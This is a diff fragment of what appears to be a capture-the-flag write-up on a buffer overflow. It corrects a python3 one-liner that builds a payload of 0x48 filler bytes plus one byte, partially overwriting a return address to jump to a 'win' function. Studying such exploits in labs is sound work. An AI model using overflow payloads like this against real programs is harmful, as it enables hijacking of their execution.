@@ -103,7 +103,7 @@ This would make the code jump to the ```win``` method.
 
 To generate the payload:
 ```
-python3 -c "with open('payload', 'wb') as f: f.write(b'\xaa'+b'\xda')"
+python3 -c "with open('payload', 'wb') as f: f.write(b'\xaa'*0x48+b'\xda')"
 ```
 We only need to write ```0xda``` as the result of the address has the same prefix (```0x4005```)
 
